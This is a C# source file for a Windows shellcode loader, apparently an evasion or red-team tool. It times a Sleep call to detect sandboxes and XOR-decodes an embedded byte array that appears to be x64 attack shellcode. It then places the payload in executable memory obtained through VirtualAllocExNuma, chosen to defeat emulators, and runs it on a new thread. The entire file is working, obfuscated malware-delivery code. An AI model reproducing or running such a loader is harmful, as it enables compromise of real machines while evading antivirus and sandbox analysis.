using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace NonEmulated
{
    public class Program
    {        

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
	static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

	[DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        public static void Main()
        {
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            byte[] buf = new byte[] { 0x5c, 0xe8, 0x23, 0x44, 0x50, 0x48, 0x6c, 0xa0, 0xa0, 0xa0, 0xe1, 0xf1, 0xe1, 0xf0, 0xf2, 0xf1, 0xf6, 0xe8, 0x91, 0x72, 0xc5, 0xe8, 0x2b, 0xf2, 0xc0, 0xe8, 0x2b, 0xf2, 0xb8, 0xe8, 0x2b, 0xf2, 0x80, 0xe8, 0x2b, 0xd2, 0xf0, 0xed, 0x91, 0x69, 0xe8, 0xaf, 0x17, 0xea, 0xea, 0xe8, 0x91, 0x60, 0x0c, 0x9c, 0xc1, 0xdc, 0xa2, 0x8c, 0x80, 0xe1, 0x61, 0x69, 0xad, 0xe1, 0xa1, 0x61, 0x42, 0x4d, 0xf2, 0xe8, 0x2b, 0xf2, 0x80, 0xe1, 0xf1, 0x2b, 0xe2, 0x9c, 0xe8, 0xa1, 0x70, 0xc6, 0x21, 0xd8, 0xb8, 0xab, 0xa2, 0xaf, 0x25, 0xd2, 0xa0, 0xa0, 0xa0, 0x2b, 0x20, 0x28, 0xa0, 0xa0, 0xa0, 0xe8, 0x25, 0x60, 0xd4, 0xc7, 0xe8, 0xa1, 0x70, 0xf0, 0x2b, 0xe8, 0xb8, 0xe4, 0x2b, 0xe0, 0x80, 0xe9, 0xa1, 0x70, 0x43, 0xf6, 0xed, 0x91, 0x69, 0xe8, 0x5f, 0x69, 0xe1, 0x2b, 0x94, 0x28, 0xe8, 0xa1, 0x76, 0xe8, 0x91, 0x60, 0xe1, 0x61, 0x69, 0xad, 0x0c, 0xe1, 0xa1, 0x61, 0x98, 0x40, 0xd5, 0x51, 0xec, 0xa3, 0xec, 0x84, 0xa8, 0xe5, 0x99, 0x71, 0xd5, 0x78, 0xf8, 0xe4, 0x2b, 0xe0, 0x84, 0xe9, 0xa1, 0x70, 0xc6, 0xe1, 0x2b, 0xac, 0xe8, 0xe4, 0x2b, 0xe0, 0xbc, 0xe9, 0xa1, 0x70, 0xe1, 0x2b, 0xa4, 0x28, 0xe8, 0xa1, 0x70, 0xe1, 0xf8, 0xe1, 0xf8, 0xfe, 0xf9, 0xfa, 0xe1, 0xf8, 0xe1, 0xf9, 0xe1, 0xfa, 0xe8, 0x23, 0x4c, 0x80, 0xe1, 0xf2, 0x5f, 0x40, 0xf8, 0xe1, 0xf9, 0xfa, 0xe8, 0x2b, 0xb2, 0x49, 0xeb, 0x5f, 0x5f, 0x5f, 0xfd, 0xe9, 0x1e, 0xd7, 0xd3, 0x92, 0xff, 0x93, 0x92, 0xa0, 0xa0, 0xe1, 0xf6, 0xe9, 0x29, 0x46, 0xe8, 0x21, 0x4c, 0x00, 0xa1, 0xa0, 0xa0, 0xe9, 0x29, 0x45, 0xe9, 0x1c, 0xa2, 0xa0, 0xbf, 0x30, 0x60, 0x08, 0x91, 0xd9, 0xe1, 0xf4, 0xe9, 0x29, 0x44, 0xec, 0x29, 0x51, 0xe1, 0x1a, 0xec, 0xd7, 0x86, 0xa7, 0x5f, 0x75, 0xec, 0x29, 0x4a, 0xc8, 0xa1, 0xa1, 0xa0, 0xa0, 0xf9, 0xe1, 0x1a, 0x89, 0x20, 0xcb, 0xa0, 0x5f, 0x75, 0xca, 0xaa, 0xe1, 0xfe, 0xf0, 0xf0, 0xed, 0x91, 0x69, 0xed, 0x91, 0x60, 0xe8, 0x5f, 0x60, 0xe8, 0x29, 0x62, 0xe8, 0x5f, 0x60, 0xe8, 0x29, 0x61, 0xe1, 0x1a, 0x4a, 0xaf, 0x7f, 0x40, 0x5f, 0x75, 0xe8, 0x29, 0x67, 0xca, 0xb0, 0xe1, 0xf8, 0xec, 0x29, 0x42, 0xe8, 0x29, 0x59, 0xe1, 0x1a, 0x39, 0x05, 0xd4, 0xc1, 0x5f, 0x75, 0x25, 0x60, 0xd4, 0xaa, 0xe9, 0x5f, 0x6e, 0xd5, 0x45, 0x48, 0x33, 0xa0, 0xa0, 0xa0, 0xe8, 0x23, 0x4c, 0xb0, 0xe8, 0x29, 0x42, 0xed, 0x91, 0x69, 0xca, 0xa4, 0xe1, 0xf8, 0xe8, 0x29, 0x59, 0xe1, 0x1a, 0xa2, 0x79, 0x68, 0xff, 0x5f, 0x75, 0x23, 0x58, 0xa0, 0xde, 0xf5, 0xe8, 0x23, 0x64, 0x80, 0xfe, 0x29, 0x56, 0xca, 0xe0, 0xe1, 0xf9, 0xc8, 0xa0, 0xb0, 0xa0, 0xa0, 0xe1, 0xf8, 0xe8, 0x29, 0x52, 0xe8, 0x91, 0x69, 0xe1, 0x1a, 0xf8, 0x04, 0xf3, 0x45, 0x5f, 0x75, 0xe8, 0x29, 0x63, 0xe9, 0x29, 0x67, 0xed, 0x91, 0x69, 0xe9, 0x29, 0x50, 0xe8, 0x29, 0x7a, 0xe8, 0x29, 0x59, 0xe1, 0x1a, 0xa2, 0x79, 0x68, 0xff, 0x5f, 0x75, 0x23, 0x58, 0xa0, 0xdd, 0x88, 0xf8, 0xe1, 0xf7, 0xf9, 0xc8, 0xa0, 0xe0, 0xa0, 0xa0, 0xe1, 0xf8, 0xca, 0xa0, 0xfa, 0xe1, 0x1a, 0xab, 0x8f, 0xaf, 0x90, 0x5f, 0x75, 0xf7, 0xf9, 0xe1, 0x1a, 0xd5, 0xce, 0xed, 0xc1, 0x5f, 0x75, 0xe9, 0x5f, 0x6e, 0x49, 0x9c, 0x5f, 0x5f, 0x5f, 0xe8, 0xa1, 0x63, 0xe8, 0x89, 0x66, 0xe8, 0x25, 0x56, 0xd5, 0x14, 0xe1, 0x5f, 0x47, 0xf8, 0xca, 0xa0, 0xf9, 0xe9, 0x67, 0x62, 0x50, 0x15, 0x02, 0xf6, 0x5f, 0x75,  };
            byte[] key = new byte[1] { 0xA0 };		
		
	    for (int i = 0; i < buf.Length; i++) 
    	    { 

        	buf[i] = (byte)(key[0] ^ (uint)buf[i]); 

            } 
            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40,0);
            if(addr == null)
            {
                return;
            }
            IntPtr outSize;
	    Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,	IntPtr.Zero, 0, IntPtr.Zero);
	    WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
